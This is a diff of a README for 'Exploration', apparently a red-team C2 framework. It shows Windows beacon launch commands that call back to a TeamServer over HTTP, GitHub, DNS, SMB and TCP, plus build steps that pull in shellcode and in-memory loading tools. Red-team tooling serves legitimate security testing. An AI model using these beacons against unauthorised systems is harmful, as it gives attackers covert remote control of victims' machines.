@@ -1,85 +1,94 @@
 # Exploration C2 Implant
 
-## What it is
+## Overview
 
-Exploration is a rudimentary redteam Command and Control framework.  
-This repository contain the Beacon in C++ to target windows.  
-The TeamServer and Client can be found in [C2TeamServer](https://github.com/maxDcb/C2TeamServer).  
+**Exploration** is a lightweight, modular Command and Control (C2) framework designed for red team operations. This repository provides the **Beacon** component implemented in C++ for targeting Windows systems. The corresponding TeamServer and Client components are available in the [C2TeamServer](https://github.com/maxDcb/C2TeamServer) repository.
 
-This project contains multiple beacon communicating with the TeamServer thought different means, here is some example:
+This project includes multiple Beacons capable of communicating with the TeamServer through a variety of channels. Supported communication methods include HTTP/HTTPS, GitHub, DNS, SMB, and TCP.
 
-```
+## Communication Examples
+
+```bash
 # HTTP/HTTPS
-BeaconHttp.exe IP_TEAMSERVER PORT_LISTENER http/https
+BeaconHttp.exe <TEAMSERVER_IP> <LISTENER_PORT> <http|https>
 BeaconHttp.exe 10.10.10.10 8443 https
 BeaconHttp.exe 10.10.10.10 8080 http
 
-# Github
-BeaconGithub.exe user/project TOKEN
+# GitHub
+BeaconGithub.exe <GITHUB_USER/REPO> <ACCESS_TOKEN>
 BeaconGithub.exe maxDcb/C2Implant ghp_dsfgdfhdf5554456g4fdg465...
 
-# Dns
-BeaconDns.exe DNS_SERVER DOM_TEAMSERVER
+# DNS
+BeaconDns.exe <DNS_SERVER> <TEAMSERVER_DOMAIN>
 BeaconDns.exe 8.8.8.8 bac.superdomain.com
 
-# Smb
-BeaconSmb.exe PIPE_NAME
-BeaconSmb.exe pipename2
+# SMB
+BeaconSmb.exe <LISTENER_IP> <PIPE_NAME>
+BeaconSmb.exe 127.0.0.1 pipename
 
-# Tcp
-BeaconTcp.exe IP_LISTENER PORT_LISTENER
+# TCP
+BeaconTcp.exe <LISTENER_IP> <LISTENER_PORT>
 BeaconTcp.exe 127.0.0.1 4444
 ```
 
-## Build 
+## Build Instructions
 
-### Sumbodule & External Projects:  
+### Submodules & External Dependencies
 
-* [Donut](https://github.com/TheWover/donut): Creat shellcode from PE files.  
-* [CoffLoader](https://github.com/trustedsec/COFFLoader): Run object files from [CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF).
-* [MemoryModule](https://github.com/fancycode/MemoryModule): Load DLL at runtime.
-* [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell): Powershell for unmanager code.
-* [cpp-base64](https://github.com/ReneNyffenegger/cpp-base64): base64.
-* [json](https://github.com/nlohmann/json): json parser.
+This project relies on several third-party libraries and tools:
 
-### Build the Windows Beacons and Modules
+* [Donut](https://github.com/TheWover/donut): Generates shellcode from PE files.
+* [COFFLoader](https://github.com/trustedsec/COFFLoader): Executes object files such as those in [CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF).
+* [MemoryModule](https://github.com/fancycode/MemoryModule): Enables runtime DLL loading.
+* [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell): Executes PowerShell from unmanaged code.
+* [cpp-base64](https://github.com/ReneNyffenegger/cpp-base64): Base64 encoding/decoding.
+* [nlohmann/json](https://github.com/nlohmann/json): JSON parsing.
 
-* https://chocolatey.org/install
-* choco install cmake --pre 
+### Preparing the Environment
 
-git submodule update --init   
-mkdir buildWindows  
-cd buildWindows 
+Install prerequisites:
 
+* [Chocolatey](https://chocolatey.org/install)
+* CMake:
+
+```bash
+choco install cmake --pre
+```
+
+Initialize submodules and set up the build directory:
+
+```bash
+git submodule update --init
+mkdir buildWindows
+cd buildWindows
+```
+
+### Building the Windows Beacons and Modules
 
 #### Windows x64
 
-with "x64 Native Tools Command Prompt for VS":  
+Using the "x64 Native Tools Command Prompt for VS":
 
+```bash
+# With tests and logging enabled:
+cmake -G "Visual Studio 17 2022" -DWITH_TESTS=ON ..
+
+# Without tests and logging:
+cmake -G "Visual Studio 17 2022" ..
+
+msbuild .\C2Implant.sln /property:Configuration=Release -m
 ```
-# With tests and logs  
-cmake  -G "Visual Studio 17 2022" -DWITH_TESTS=ON ..   
-# Without tests and logs  
-cmake  -G "Visual Studio 17 2022" ..   
-msbuild .\C2Implant.sln /property:Configuration=Release -m  
-```
 
-or  
-compile the generated C2.sln in release with Visual studio (config Runtime Library Multi-threaded (/MT) & Release)   
-
+Alternatively, open the generated `C2Implant.sln` in Visual Studio and build in **Release** mode. Ensure the Runtime Library is set to **Multi-threaded (/MT)**.
 
 #### Windows x86
 
+```bash
+cmake -G "Visual Studio 17 2022" -A "Win32" ..
+msbuild .\C2Implant.sln /property:Configuration=Release /p:Platform=Win32 -m
 ```
-cmake  -G "Visual Studio 17 2022" -A "Win32" ..   
-msbuild .\C2Implant.sln /property:Configuration=Release /p:Platform=Win32 -m  
-```
 
-#### Production
+### Output Locations
 
-Beacons are in: "Release\Beacons"  
-Modules DLL in: "Release\Modules"   
-
-
-
-
+* Compiled Beacons: `Release\Beacons`
+* Compiled Module DLLs: `Release\Modules`
